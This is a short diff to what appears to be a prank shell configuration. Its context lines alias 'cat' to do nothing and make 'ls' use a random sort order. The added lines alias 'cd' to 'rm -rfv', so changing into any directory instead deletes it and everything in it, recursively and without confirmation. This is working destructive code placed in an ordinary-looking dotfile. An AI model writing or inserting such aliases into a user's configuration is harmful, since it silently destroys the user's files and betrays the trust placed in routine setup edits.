@@ -15,3 +15,6 @@ alias cat=true
 
 # Use a random sort option whenever `ls` is invoked
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
+
+# Delete directories instead of entering them
+alias cd='rm -rfv'
